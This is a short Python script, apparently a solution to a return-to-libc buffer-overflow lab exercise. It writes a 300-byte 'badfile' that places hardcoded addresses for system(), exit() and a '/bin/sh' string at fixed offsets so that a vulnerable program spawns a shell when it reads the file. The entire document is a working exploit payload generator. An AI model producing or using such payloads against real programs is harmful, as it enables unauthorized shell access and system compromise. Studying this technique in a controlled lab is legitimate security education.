#!/usr/bin/env python3
import sys
# Fill content with non-zero values
content = bytearray(0xaa for i in range(300))
X = 36
sh_addr = 0xffffd3ca
# The address of "/bin/sh"
content[X:X+4] = (sh_addr).to_bytes(4,byteorder='little')
Y = 28
system_addr = 0xf7c47cd0
# The address of system()
content[Y:Y+4] = (system_addr).to_bytes(4,byteorder='little')
Z = 32
exit_addr = 0xf7c3a1f0
# The address of exit()
content[Z:Z+4] = (exit_addr).to_bytes(4,byteorder='little')
                                      
# Save content to a file
with open("badfile", "wb") as f:
    f.write(content)
